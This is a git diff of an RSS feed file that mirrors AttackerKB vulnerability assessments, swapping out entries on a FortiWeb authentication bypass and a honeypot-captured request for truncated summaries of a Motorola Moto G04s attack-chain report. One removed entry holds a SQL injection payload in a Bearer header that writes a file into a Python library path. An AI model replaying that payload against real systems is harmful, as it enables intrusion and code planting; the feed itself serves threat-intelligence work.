@@ -7,45 +7,7 @@
     <atom:link href="https://fetsoc.github.io/rssfeeds/feeds/attackerkb.xml" rel="self"/>
     <docs>http://www.rssboard.org/rss-specification</docs>
     <generator>python-feedgen</generator>
-    <lastBuildDate>Fri, 26 Jun 2026 08:54:50 +0000</lastBuildDate>
-    <item>
-      <title>CVE-2025-64446</title>
-      <link>https://attackerkb.com/assessments/99da1ce6-0081-41e8-8a62-4ecf729a6586</link>
-      <description>Attacker Value: 5/5 | Exploitability: 5/5 | MITRE: Execution
-
-8.0.1&#13;
-&#13;
- CVE-2025-64446 – Fortinet FortiWeb Auth. Bypass | Path Traversal Vulnerability &#13;
- What is:&#13;
-It is a full authentication‑bypass exploit that creates a new admin user on a FortiWeb device — including:&#13;
-&#13;
-- Path traversal&#13;
-- Forged CGIINFO header&#13;
-- Admin‐privilege creation&#13;
-- API abuse to push a new local user&#13;
-&#13;
- Overview&#13;
-CVE-2025-64446 is a critical path traversal vulnerability affecting multiple versions of Fortinet FortiWeb, a Web Application Firewall (WAF) used to protect web applications and APIs.  &#13;
-The vulnerability allows an unauthenticated remote attacker to send specially c…</description>
-      <guid isPermaLink="false">https://attackerkb.com/assessments/99da1ce6-0081-41e8-8a62-4ecf729a6586</guid>
-      <pubDate>Sat, 15 Nov 2025 16:59:02 +0000</pubDate>
-    </item>
-    <item>
-      <title>Assessment ccb5097e</title>
-      <link>https://attackerkb.com/assessments/ccb5097e-52f5-411c-b4f6-951b36b166d7</link>
-      <description>Attacker Value: 5/5 | Exploitability: 5/5
-
-In one of our honeypots we observed the following payload being executed:&#13;
-&#13;
-GET /api/fabric/device/status HTTP/1.1&#13;
-User-Agent: Mozilla/5.0 (Windows NT 6.0; ber-MA; rv:1.9.0.20) Gecko/2976-07-21 17:07:38 Firefox/6.0&#13;
-Accept-Encoding: gzip, deflate&#13;
-Accept: /&#13;
-Connection: keep-alive&#13;
-Authorization: Bearer ';select//a//from//fabricuser.a//into//outfile//'/var/log/lib/python3.10/pylab.py'//FIELDS//ESCAPED//BY//'</description>
-      <guid isPermaLink="false">https://attackerkb.com/assessments/ccb5097e-52f5-411c-b4f6-951b36b166d7</guid>
-      <pubDate>Mon, 17 Nov 2025 14:29:54 +0000</pubDate>
-    </item>
+    <lastBuildDate>Fri, 26 Jun 2026 14:09:47 +0000</lastBuildDate>
     <item>
       <title>Assessment fbacb2a6</title>
       <link>https://attackerkb.com/assessments/fbacb2a6-d1cd-4011-bb3a-f06b1c8306b1</link>
@@ -713,6 +675,46 @@ Certificate:&#13;
    …</description>
       <guid isPermaLink="false">https://attackerkb.com/assessments/c7c1028a-a1dc-4c2e-a90f-0abe1e957367</guid>
       <pubDate>Thu, 25 Jun 2026 01:00:27 +0000</pubDate>
+    </item>
+    <item>
+      <title>CVE-2022-38694</title>
+      <link>https://attackerkb.com/assessments/b3ca6492-ecae-4257-82d5-c0358a3a9db5</link>
+      <description>Attacker Value: 5/5 | Exploitability: 5/5 | MITRE: Persistence
+
+:&#13;
+&#13;
+---&#13;
+&#13;
+Security Investigation Report: Motorola Moto G04s (Unisoc T606)&#13;
+Date: June 26, 2026  &#13;
+Target Device: Motorola Moto G04s, Model XT2331-4  &#13;
+Chipset: Unisoc T606, Octa-core  &#13;
+ODM: Longcheer  &#13;
+Region Focus: Latin America, Mexico  &#13;
+Investigator: Independent Security Research&#13;
+&#13;
+1. Executive Summary&#13;
+The Motorola Moto G04s contains a critical chain of vulnerabilities stemming from the Unisoc T606 chipset firmware and aggressive pre-installed system applications from Digital Turbine and InMobi. The combination of an unpatchable BootROM exploit CVE-2022-38694, active modem RCE vulner…</description>
+      <guid isPermaLink="false">https://attackerkb.com/assessments/b3ca6492-ecae-4257-82d5-c0358a3a9db5</guid>
+      <pubDate>Fri, 26 Jun 2026 13:01:43 +0000</pubDate>
+    </item>
+    <item>
+      <title>CVE-2022-38694</title>
+      <link>https://attackerkb.com/assessments/0e5f0b3f-7394-46ad-b3b5-160ee022a28f</link>
+      <description>Attacker Value: 5/5 | Exploitability: 5/5 | MITRE: Persistence
+
+Motorola Moto G04s (Unisoc T606) - "Remote Rescue" Attack Vector: BootROM + WireGuard + MACsec + Persistent Memory Abuse&#13;
+&#13;
+CVE-IDs: CVE-2022-38694, CVE-2025-31718, CVE-2024-43859, CVE-2021-3712  &#13;
+CVSS v3.1: 8.8 (AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) - Critical  &#13;
+Affected: Motorola Moto G04s XT2331-4, Unisoc T606 SoC. High prevalence in Mexico/LATAM  &#13;
+Discovery Date: June 26, 2026  &#13;
+Researcher: Independent Security Research, Mexico&#13;
+&#13;
+1. Executive Summary&#13;
+The Motorola Moto G04s, powered by the Unisoc T606 chipset, contains a high-severity attack chain within its Rescue Party recovery mecha…</description>
+      <guid isPermaLink="false">https://attackerkb.com/assessments/0e5f0b3f-7394-46ad-b3b5-160ee022a28f</guid>
+      <pubDate>Fri, 26 Jun 2026 13:04:03 +0000</pubDate>
     </item>
   </channel>
 </rss>
